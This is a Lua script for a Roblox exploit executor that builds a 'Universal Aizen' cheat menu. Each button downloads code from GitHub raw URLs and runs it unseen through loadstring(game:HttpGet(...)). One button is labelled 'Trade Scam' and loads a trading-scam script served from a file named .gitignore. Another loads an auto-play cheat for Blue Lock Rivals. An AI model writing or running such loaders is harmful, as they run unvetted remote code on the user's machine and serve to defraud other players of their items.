-- Load Kavo UI Library with Error Handling
local success, Library = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
end)

if not success then
    warn("Failed to load Kavo UI Library. Check your internet or executor.")
    return
end

-- Create Main UI Window
local Window = Library.CreateLib("Universal Aizen", "Sentinel") -- Renamed Aizen to Universal Aizen

-- Main Tab
local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Universal Aizen Scripts")

MainSection:NewLabel("Welcome to Universal Aizen!")

-- Pop It Trading Button
MainSection:NewButton("Pop It Trading", "Trade Scam", function()
    local popit_success, popit_err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/refs/heads/main/.gitignore"))()
    end)

    if not popit_success then
        warn("Pop It Trading script failed to load.")
    end
    print("Pop It Trading script executed!")
end)

-- Blue Lock Rivals Script
MainSection:NewButton("Blue Lock Rivals", "Auto play script", function()
    local bluelock_success, bluelock_err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/refs/heads/main/TbaoHubBlueLockRivals"))()
    end)

    if not bluelock_success then
        warn("Blue Lock Rivals script failed to load.")
    end
    print("Blue Lock Rivals script executed!")
end)

-- **Auto-Adjusting GUI for Mobile & PC**
local UserInputService = game:GetService("UserInputService")
if UserInputService.TouchEnabled then
    print("Running on Mobile - UI will be draggable by touch!")
else
    print("Running on PC - UI will be controlled by keyboard!")
end

-- **Make GUI Draggable for Mobile**
Library:ToggleUI() -- Automatically makes the UI draggable without keyboard toggle

print("Universal Aizen Loaded Successfully!")
